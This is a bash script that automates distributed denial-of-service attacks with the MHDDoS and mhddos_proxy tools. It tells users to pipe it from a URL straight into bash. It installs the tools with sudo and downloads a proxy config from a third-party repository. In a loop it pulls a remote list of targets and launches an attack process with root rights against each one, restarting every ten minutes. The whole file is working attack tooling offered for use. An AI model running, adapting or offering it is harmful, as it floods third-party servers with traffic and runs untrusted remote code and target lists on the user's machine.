#!/bin/bash
##### Use next command in local linux terminal to run this script.
#  >>>>>   curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash  <<<<<
##### It is possible to pass arguments "num_of_copies" and "restart_interval" to script.
##### curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash -s -- 2 1800 (launch with num_of_copies=2 and restart_interval=1800)

##### To kill script just close terminal window. OR. In other terminal run 'pkill -f python3'. And press CTRL+C in main window.



## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
## It allows to download updates for mhddos_proxy, MHDDoS and target list.
## By default 600s (10m), can be passed as second parameter
restart_interval="10m"


#parameters that passed to python scrypt
#threads="-t 1000"
rpc="--rpc 100"
proxy_interval="-p 600"

#Just in case kill previous copy of mhddos_proxy
sudo pkill -f runner.py
sudo pkill -f ./start.py


sudo apt update -y
sudo apt upgrade -y
# Install git, python3
sudo apt install git gcc libc-dev libffi-dev libssl-dev python3-dev rustc -y
sudo apt install git -y
sudo apt upgrade git -y
sudo apt install wget -y
sudo apt upgrade wget -y
sudo apt install python3 -y
sudo apt upgrade python3 -y
sudo apt install python3-pip -y
sudo apt upgrade python3-pip -y
sudo apt install screen -y
sudo apt upgrade screen -y
sudo apt install curl -y
sudo apt upgrade curl -y


#Install latest version of mhddos_proxy and MHDDoS
cd ~
sudo rm -r mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
sudo rm proxies_config.json
sudo wget https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json
git clone https://github.com/MHProDev/MHDDoS.git
sudo pip3 install -r MHDDoS/requirements.txt
cd ~

# Restart attacks and update targets list every 10 minutes (by default)
while [ 1 == 1 ]
#echo -e "#####################################\n"
do
   # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
   list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos/main/runner_targets | cat | grep "^runner.py" | wc -l)
   
   echo -e "\nNumber of targets in list: " $list_size "\n"

   
      
   # Launch multiple mhddos_proxy instances with different targets.
   for (( i=1; i<=list_size; i++ ))
   do
            echo -e "\n I = $i"
            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos/main/runner_targets | cat | grep "^runner.py")")
           

            echo "\nfull cmd:\n"
            echo "$cmd_line $proxy_interval $rpc"
            
            cd ~/mhddos_proxy
            sudo python3 $cmd_line $proxy_interval $rpc&
            #nohup sudo python3 $cmd_line $proxy_interval $rpc </dev/null &>/dev/null &
            echo -e "\nAttack started successfull\n"
   done
   
   echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
   sleep $restart_interval
   clear
   echo -e "\nRESTARTING\n"
   sudo pkill -f runner.py
   sudo pkill -f ./start.py
done
